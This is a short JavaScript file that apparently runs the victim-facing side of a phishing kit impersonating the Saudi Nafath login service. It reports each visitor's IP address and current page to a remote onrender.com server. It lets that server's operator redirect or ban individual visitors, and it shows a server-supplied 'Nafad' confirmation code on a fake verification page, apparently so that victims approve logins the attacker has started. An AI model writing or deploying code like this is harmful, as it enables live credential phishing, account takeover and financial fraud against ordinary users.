// js/ind.js
(function() {
    const SERVER_URL = "https://server-2h6g.onrender.com";
    const socket = io(SERVER_URL, { transports: ["websocket", "polling"] });
    window.socket = socket;
    window.visitorIP = null;

    async function init() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            window.visitorIP = data.ip;
            
            const page = window.location.pathname.split("/").pop() || "index.html";
            socket.emit("updateLocation", { ip: window.visitorIP, page: page });

            // استرجاع الكود الخاص بنفاذ إذا كنا في صفحة نفاذ
            if (page === "nafad-basmah.html") {
                socket.emit("getNafadCode");
            }
        } catch (e) {
            console.error("Init error:", e);
        }
    }

    init();

    socket.on("navigateTo", (data) => {
        if (data.ip === window.visitorIP) {
            window.location.href = data.page;
        }
    });

    socket.on("banned", () => {
        window.location.href = "banned.html";
    });

    socket.on("nafadCode", (data) => {
        const codeElem = document.getElementById("basmahCode");
        if (codeElem && data.code) {
            codeElem.innerText = data.code;
        }
    });
})();
